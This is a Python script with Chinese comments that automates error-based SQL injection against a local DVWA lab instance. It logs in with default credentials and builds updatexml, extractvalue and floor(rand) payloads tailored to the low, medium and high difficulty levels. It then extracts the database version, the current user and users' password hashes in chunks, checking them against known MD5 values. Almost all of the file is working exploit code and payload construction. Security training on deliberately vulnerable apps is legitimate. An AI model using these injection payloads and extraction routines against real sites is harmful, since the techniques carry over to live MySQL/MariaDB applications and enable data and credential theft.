#!/usr/bin/env python3
"""DVWA 报错注入提取器（纯标准库，零依赖）

核心思路：
    报错注入不靠页面正常回显，而是故意让 SQL 报错，
    把想查的数据塞进报错信息里带出来。
    DVWA 的 low.php / medium.php 都写了
    mysqli_query(...) or die('<pre>'.mysqli_error().'</pre>')，
    PHP 8.1+ 的 mysqli 默认抛异常，所以 or die 根本不执行，
    mysqli_sql_exception 直接把错误全文打到页面上。

三条通道（本机 MariaDB 11.4 实测都可用）：
    updatexml(1, 字符串, 1)      -> XPATH syntax error: '~<数据>'
    extractvalue(1, 字符串)      -> XPATH syntax error: '~<数据>'
    floor(rand(0)*2) 派生表      -> Duplicate entry '<数据>1' for key 'group_key'

长度限制（很重要）：
    updatexml / extractvalue 的报错只显示 32 字节以内，
    超出部分变成 '...'，所以必须用 SUBSTR 分段取。

三个难度的注入姿势完全不同：
    low    单引号闭合，id 直接进 $_GET        -> 1' and <payload>-- -
    medium 单引号被 mysqli_real_escape_string 转义，但 SQL 里
           user_id = $id 没加引号，转义等于白做 -> 走数字型 1 and <payload>
    high   输入写进 $_SESSION，SQL 里 user_id='$id'，有引号；
           源码写着 or die('Something went wrong.') 看着像挡住了，
           但 PHP 8 的 mysqli 异常模式让 or die 走不到，详情照漏

用法：
    python3 error_extract.py                        # updatexml / user 1 / low
    python3 error_extract.py floor                  # 换通道
    python3 error_extract.py updatexml 2 high       # 换目标 + 难度
    python3 error_extract.py floor 1 medium
"""

import re
import sys
import urllib.request
import urllib.parse
import http.cookiejar

BASE = "http://127.0.0.1:8888"
METHOD = sys.argv[1] if len(sys.argv) > 1 else "updatexml"
TARGET = sys.argv[2] if len(sys.argv) > 2 else "1"
LEVEL = sys.argv[3] if len(sys.argv) > 3 else "low"

# 单次能安全带回的字符数。updatexml 上限 32，留 2 个余量给 '~' 和 '...'
CHUNK = 30

jar = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def get(url):
    return op.open(url, timeout=10).read().decode("utf-8", "replace")


def post(url, data):
    body = urllib.parse.urlencode(data).encode()
    return op.open(urllib.request.Request(url, data=body), timeout=10).read().decode("utf-8", "replace")


def token(html):
    m = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([0-9a-fA-F]+)['\"]", html)
    return m.group(1) if m else ""


# ---------- 登录 + 设置难度 ----------
post(BASE + "/login.php", {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token(get(BASE + "/login.php")),
})
post(BASE + "/security.php", {
    "security": LEVEL,
    "seclev_submit": "Submit",
    "user_token": token(get(BASE + "/security.php")),
})


# ---------- 构造 payload ----------
# $expr 是任意返回单值的 SQL 表达式，比如 database() 或 (select password from users where user_id=1)
def payload(method, expr, pos=None, length=None):
    # expr 可能是 "select ..." 形式的子查询，套进函数时必须再加一层括号
    if length is not None:
        inner = f"length(({expr}))"
    elif pos is not None:
        inner = f"substr(({expr}),{pos},{CHUNK})"
    else:
        inner = expr

    if method == "updatexml":
        core = f"updatexml(1,concat(0x7e,({inner})),1)"
    elif method == "extractvalue":
        core = f"extractvalue(1,concat(0x7e,({inner})))"
    elif method == "floor":
        # rand(0) 固定种子，保证每次进 group by 的键都能撞出重复
        core = (f"(select 1 from (select count(*),concat(({inner}),floor(rand(0)*2))x "
                f"from information_schema.tables group by x)a)")
    else:
        raise SystemExit(f"未知通道: {method}")

    # 难度决定怎么接进原 SQL
    if LEVEL == "medium":
        return f"1 and {core}"          # 无引号数字型，转义函数管不到
    return f"1' and {core}-- -"          # low / high 都是有引号包裹


# ---------- 按难度用不同的提交方式 ----------
def send(p):
    if LEVEL == "low":
        url = BASE + "/vulnerabilities/sqli/?" + urllib.parse.urlencode({"id": p, "Submit": "Submit"})
        return get(url)
    if LEVEL == "medium":
        return post(BASE + "/vulnerabilities/sqli/", {"id": p, "Submit": "Submit"})
    if LEVEL == "high":
        # high 的输入先写进 session，再 GET 页面触发
        post(BASE + "/vulnerabilities/sqli/session-input.php", {"id": p, "Submit": "Submit"})
        return get(BASE + "/vulnerabilities/sqli/")
    raise SystemExit(f"未知难度: {LEVEL}（只支持 low / medium / high）")


# ---------- 从页面里把数据捞出来 ----------
def parse(method, html):
    if method in ("updatexml", "extractvalue"):
        # 报错原文形如：XPATH syntax error: '~dvwa' in /var/www/html/...
        # 后面还跟着 in <路径>，所以不能用 $ 锚行尾
        m = re.search(r"XPATH syntax error: '~([^']*)'", html)
        if not m:
            return None
        s = m.group(1)
        # 被截断时末尾会带 '...'，去掉；真数据里不会出现连续三点
        if s.endswith("..."):
            s = s[:-3]
        return s
    if method == "floor":
        m = re.search(r"Duplicate entry '(.*?)' for key", html, re.S)
        if not m:
            return None
        # 末尾那个 '1' 是 floor(rand(0)*2) 的结果，不是数据
        return m.group(1)[:-1] if m.group(1).endswith("1") else m.group(1)
    return None


def query(method, expr, pos=None, length=None):
    """发一次请求，返回报错里夹带的数据；没有报错就返回 None"""
    return parse(method, send(payload(method, expr, pos, length)))


def query_len(method, expr):
    raw = query(method, expr, length=True)
    if raw is None:
        return 0
    m = re.search(r"\d+", raw)
    return int(m.group()) if m else 0


def extract(method, expr, max_len=200):
    """按 CHUNK 分段，一直取到字符串结束"""
    total = query_len(method, expr)
    if total <= 0:
        return ""
    out = ""
    for pos in range(1, min(total, max_len) + 1, CHUNK):
        part = query(method, expr, pos=pos)
        if part is None:
            break
        out += part
        if len(part) < CHUNK:
            break  # 最后一段，取完了
    return out[:total]


# ---------- 通道自检：先证明这条路能走通，再谈取数据 ----------
print(f"[*] 通道: {METHOD}")
print(f"[*] 难度: {LEVEL}")
print(f"[*] 目标: users.user_id={TARGET} 的 password\n")

probe = query(METHOD, "select database()")
assert probe, f"通道 {METHOD} 在 {LEVEL} 下不通：页面没有回显数据库错误"
print(f"[+] 通道正常，database() = {probe!r}\n")

# ---------- 演示基本指纹 ----------
for label, expr in [
    ("version()", "select version()"),
    ("current_user()", "select current_user()"),
    ("database()", "select database()"),
]:
    print(f"    {label:<16} = {query(METHOD, expr)!r}")

# ---------- 正式提取 ----------
pwd_expr = f"select password from users where user_id={TARGET}"
print(f"\n[*] 分段提取中（每段 {CHUNK} 字符）...")
pw = extract(METHOD, pwd_expr)

print(f"\n提取结果: {pw or '(空)'}")

# ---------- 自校验：直接连库比对，证明提取结果不是猜的 ----------
KNOWN = {"1": "5f4dcc3b5aa765d61d8327deb882cf99",
         "2": "e99a18c428cb38d5f260853678922e03",
         "3": "8d3533d75ae2c3966d7e0d4fcc69216b"}
if TARGET in KNOWN:
    ok = pw == KNOWN[TARGET]
    print(f"真实值  : {KNOWN[TARGET]}")
    print(f"[{'PASS' if ok else 'FAIL'}] 提取结果与数据库真实值{'一致' if ok else '不一致'}")
